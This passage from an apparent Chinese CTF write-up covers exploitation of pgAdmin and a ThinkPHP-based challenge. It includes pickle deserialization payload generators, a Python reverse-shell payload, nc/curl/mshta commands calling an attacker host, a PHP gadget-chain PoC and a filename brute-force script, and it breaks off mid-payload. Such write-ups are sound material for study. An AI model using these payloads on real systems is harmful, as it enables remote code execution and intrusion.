<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db8933b3.png" alt="image-20240325224759191"></p>
<p>posix.pickle文件生成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">produce_pickle_bytes</span>(<span class="params">platform, cmd</span>):</span><br><span class="line">    b = <span class="string">b&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, <span class="number">22</span> + <span class="built_in">len</span>(platform) + <span class="built_in">len</span>(cmd))</span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(platform)) + platform.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(cmd)) + cmd.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        exit(<span class="string">f&quot;usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> ip:port&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nt.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;nt&#x27;</span>, <span class="string">f&quot;mshta.exe http://<span class="subst">&#123;HOST&#125;</span>/&quot;</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, <span class="string">f&quot;curl http://<span class="subst">&#123;HOST&#125;</span>/&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>创建两个序列化对象，一个用于 Windows（），一个用于 Linux&#x2F;POSIX（），它们将在反序列化时执行 HTTP 请求</p>
<p>所以要稍微改一下 生成文件的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">produce_pickle_bytes</span>(<span class="params">platform, cmd</span>):</span><br><span class="line">    b = <span class="string">b&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, <span class="number">22</span> + <span class="built_in">len</span>(platform) + <span class="built_in">len</span>(cmd))</span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(platform)) + platform.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(cmd)) + cmd.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, <span class="string">f&quot;nc ip port -e /bin/sh&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>根据上文</p>
<p>接下来就是上传文件 然后改cookie和替换pga4_session</p>
<blockquote>
<p>将 cookie 值更改为替换为当前登录用户的电子邮件，</p>
<p>然后替换为<code>pga4_session../storage/&lt;email&gt;/posix.pickle!a&lt;email&gt;@_</code></p>
</blockquote>
<p>并且我们的cookie路径是绝对路径而不是相对的   &#x2F;var&#x2F;lib&#x2F;pgadmin&#x2F;storage&#x2F;tacooooo_qq.com&#x2F;posix.pickle!a</p>
<p>所以现在我们需要找到一个可以上传文件的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441dbb3e5f1.png" alt="image-20240326000715537"></p>
<p>最后在这里面找到文件上传系统</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db712a7d.png" alt="image-20240326001309065"></p>
<p>运行 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441dbbee4be.png" alt="image-20240326001953198"></p>
<p>其实是生成一段Pickle反序列化后的代码 这里是没加ip的</p>
<p>记得要加Ip和端口</p>
<p>所以直接来也是一样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = exp()</span><br><span class="line">    payload = pickle.dumps(c)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br></pre></td></tr></table></figure>



<p>上传文件posix.pickle</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7621b0.png" alt="image-20240326002549806"></p>
<p>然后随便抓包改cookie</p>
<p>再反弹shell即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7494d8.png" alt="image-20240326004459228"></p>
<h2 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h2><p>这个是完全没思路 审了半天源码 其实感觉是反序列化 但是代码太多了 没找到链子</p>
<p><strong>think反序列化</strong></p>
<p>题目：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7391bc.png" alt="image-20240326005418505"></p>
<p>进来是个登录界面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db9a67fb.png" alt="image-20240326005453711"></p>
<p>给了源码</p>
<p>简单看下源码其实就能发现有一些魔术方法 这也是我为什么猜测有反序列化漏洞的原因</p>
<p>所以直接搜unserialize</p>
<p>thelover3\files\app\controller\user\think\Template.php中有unserialize</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db8adc26.png" alt="image-20240326012724127"></p>
<p>thelover3\files\app\controller\user\think\Testone.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db76b944.png" alt="image-20240326012853029"></p>
<p>thelover3\files\app\controller\user\index.class.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db84fbb9.png" alt="image-20240326013324096"></p>
<p>这个还有提示 不出意外的话就是这个了 保险起见 继续找下</p>
<p>thelover3\files\app\api\KodSSO.class.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db89a247.png" alt="image-20240326013917710"></p>
<p>thelover3\files\app\function\common.function.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7e0ba2.png" alt="image-20240326014024928"></p>
<p>差不多了 </p>
<p>其实就是第三个 </p>
<p>给了hint ：tp-&gt;thinkphp</p>
<p>所以是thinkphp反序列化 且这里是是链子的开头</p>
<p>接下来就是用一样的方法找<code>__destruct</code>方法和<code>__wakeup</code></p>
<p><strong>__destruct:</strong></p>
<p>thelover3\files\app\controller\user\think\process\pipes\Windows.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db73c709.png" alt="image-20240326015142272"></p>
<p>thelover3\files\app\controller\user\think\Process.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db6689b1.png" alt="image-20240326015250578"></p>
<p>thelover3\files\app\controller\user\think\process\pipes\Unix.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db76457b.png" alt="image-20240326015353427"></p>
<p>只有三个</p>
<p>根据代码 第一个是链子的可能新最高</p>
<p><strong>__wakeup:</strong></p>
<p>thelover3\files\app\controller\user\think\process\pipes\Windows.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db6889f2.png" alt="image-20240326015646878"></p>
<p>D:\流量\thelover3\files\app\controller\user\think\process\pipes\Pipes.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db6d4708.png" alt="image-20240326015717657"></p>
<p>只有两个 并且这两个都没什么用</p>
<p>所以第一个__destruct应该有链子</p>
<p>查找资料后发现：</p>
<p>和<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/284091.html">tp5.0.24</a>很像</p>
<p>根据文章继续跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进close():</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db798f42.png" alt="image-20240326020947054"></p>
<p>close为关闭文件的方法，没有利用点</p>
<p>跟进removeFiles()：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db838d2f.png" alt="image-20240326021123398"></p>
<p>此处对 <code>$result </code>进行了赋值，其中包含字段<code>$filename</code>是可控的，所以可以触发 toString 魔术方法</p>
<p>根本没想到这里QAQ</p>
<p>又是一处思维误区 习惯性的在Windows.php中找 没有 最后在Collection.php中找到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db72c1f4.png" alt="image-20240326021644991"></p>
<p>这里可以继续跟进toJson() 太难找了</p>
<p>thelover3\files\app\controller\user\think\Collection.php</p>
<p>在Collection.php里面的话为什么我最开始没找到QAQ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db792157.png" alt="image-20240326024642098"></p>
<p>一样在Collection.php继续跟进toArray()</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db78ea5b.png" alt="image-20240326024913038"></p>
<p>这里的$items也是可控的，所以可以触发__get 魔术方法 访问不存在的属性</p>
<p>而在上文提到的文章中发现他的toArray()很长</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ........</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里其实是在触发__call方法</p>
<p>所以我们这里也要想办法触发__call方法</p>
<p>找到__get</p>
<p>thelover3\files\app\controller\user\think\View.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db8ab9c5.png" alt="image-20240326030040471"></p>
<p>$data 参数也是可控的，接着我们就能调用__call方法</p>
<p>但是其实是有两个__call方法 如下:</p>
<p>thelover3\files\app\controller\user\think\Config.php  这个可以包含文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db8b27ca.png" alt="image-20240326030301317"></p>
<p>thelover3\files\app\controller\user\think\Testone.php  这个可以写文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db91d949.png" alt="image-20240326030409253"></p>
<p>第二个__call：我们的content 写进去的内容来自于hint.php 我们跟进</p>
<p>hinthinthinthinthinthinthint.php：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7a68f4.png" alt="image-20240326030755478"></p>
<p>说明我们的content里面有提示，所以我们的思路就是首先走写文件的__call,然后读hint 直接放poc了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Collection</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Collection</span>()];<span class="comment">//触发Model __toString(),子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Collection</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$items</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;items=<span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> <span class="keyword">extends</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;time&quot;</span>=&gt;<span class="string">&quot;10086&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Debug</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>

<p>注意生成文件名的逻辑：</p>
<p>md5(time())</p>
<p>所以我们可以根据本地预测时间的方式执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">time</span>()+<span class="number">6</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>然后执行这个脚本后 马上重复发包（生成hint的包），连发六秒，保险起见 也可以多发几秒，这样总有一个是我们的生成的文件名</p>
<p>其实可以直接写时间md5竞争上传脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">t = <span class="number">1711177055</span></span><br><span class="line">url = <span class="string">&quot;http://119b2b2c-d2c8-491a-a211-886d4261cdb8.node.nkctf.yuzhian.com.cn/app/controller/user/think/&quot;</span></span><br><span class="line"><span class="comment"># 遍历列表中的每个数字</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = t + <span class="number">1</span></span><br><span class="line">    number_str = <span class="built_in">str</span>(t).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hash_object = hashlib.md5(number_str)</span><br><span class="line">    md5_hash = hash_object.hexdigest()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url+md5_hash)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;md5_hash&#125;</span> : f<span class="subst">&#123;<span class="built_in">len</span>(res.text)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>&#x2F;app&#x2F;controller&#x2F;user&#x2F;think&#x2F;md5 下载到hint</p>
<p>也可以直接爆破文件名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://192.168.146.131:3101/?user/index/loginSubmit&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM</span></span><br><span class="line"><span class="string">0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2Oi</span></span><br><span class="line"><span class="string">J0aGlua1xDb2xsZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3I</span></span><br><span class="line"><span class="string">joyOntzOjc6IgAqAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMToidGhpbmtcRGVi</span></span><br><span class="line"><span 